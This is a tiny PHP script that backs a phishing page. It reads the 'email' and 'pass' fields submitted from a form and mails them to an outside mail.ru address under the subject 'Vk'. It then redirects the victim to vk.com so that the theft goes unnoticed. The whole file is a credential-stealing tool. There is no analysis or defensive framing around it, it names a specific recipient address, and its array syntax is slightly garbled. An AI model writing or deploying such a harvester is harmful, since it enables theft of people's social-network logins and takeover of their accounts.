<?php
$message = $_POST'email' . ':' . $_POST'pass';
$message = wordwrap($message, 70, "<br>");
mail('sanya.sadovnikov.15@mail.ru', 'Vk', $message, "From: example@mail.ru");
header('Location: http://vk.com/id0?196712280');
?>
